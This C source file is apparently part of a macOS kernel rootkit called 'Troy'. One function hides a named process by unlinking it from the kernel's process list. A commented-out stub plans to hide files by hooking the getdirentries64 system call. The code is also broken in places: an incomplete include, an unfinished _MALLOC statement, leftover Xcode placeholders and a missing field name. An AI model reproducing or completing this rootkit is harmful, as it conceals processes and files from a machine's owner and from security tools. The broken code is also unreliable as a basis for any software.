//
//  HookCAPI.c
//  Troy
//
//  Created by Axis on 5/8/15.
//  Copyright (c) 2015 Axis. All rights reserved.
//
#include <libkern/libkern.h>
#include <sys/errno.h>
#include <sys/lock.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/>

#include "HookCAPI.h"
#include "configure.h"
#include "debugInfo.h"
#include "HookSystemCall.h"

#pragma mark lock
extern lck_mtx_t *lck_mtx_hide_process;
extern lck_mtx_t *lck_mtx_hide_file;
extern lck_mtx_t *lck_mtx_hide_directory;
#pragma mark hide_array
extern struct hide_proc_list hide_proc_array;  //for store process that is hide

errno_t hide_given_process(troy_hide_object *process_hide)
{
    if(process_hide==NULL) return TROY_ERROR_INVALID_PARAMETER;
    if(process_hide->objec_type!=TROY_PROCESS)
    {
        LOG(LOG_ERROR, "The file types are not matched.");
        return TROY_ERROR_NOT_MATCH;
    }

    lck_mtx_lock(lck_mtx_hide_process);

    struct proc_yousemite* kernel_proc = (struct proc_yousemite*)kernproc;
    char process_name[PROCESS_NAME_LENGTH];
    bzero(process_name, PROCESS_NAME_LENGTH);
    do
    {
        int pid=proc_pid((proc_t)kernel_proc);
        proc_name(pid, process_name, PROCESS_NAME_LENGTH);
        LOG(LOG_ERROR, "process name is %s", process_name);
        if(strcasecmp(process_name, process_hide->name)==0)
        {
            LOG(LOG_INFO, "Get process name scuuessfully");
            LIST_REMOVE(kernel_proc, p_list);

            struct hide_proc *proc = _MALLOC

            TAILQ_INSERT_HEAD(&hide_proc_array, kernel_proc, next_ptr);
        }
        /*
         * here we must use le_prev, because le_next is NULL.
         * and current kernproc's name is kernel_task
         */
        kernel_proc = (struct proc_yousemite*)kernel_proc->p_list.le_prev;
    }while(kernel_proc);

    lck_mtx_unlock(lck_mtx_hide_process);

    return TROY_SUCCESS;
}

/*errno_t hide_specific_files(troy_hide_object *files_hide)
{
    sy_call_t *
    GetOriginalFunction(SYS_getdirentries64, <#sy_call_t **orginal_ptr#>)
    SetSystemCallHandle(<#void *function_handle#>, <#int syscall_no#>, <#int syscall_nargs#>, <#void *original_handle#>)
}*/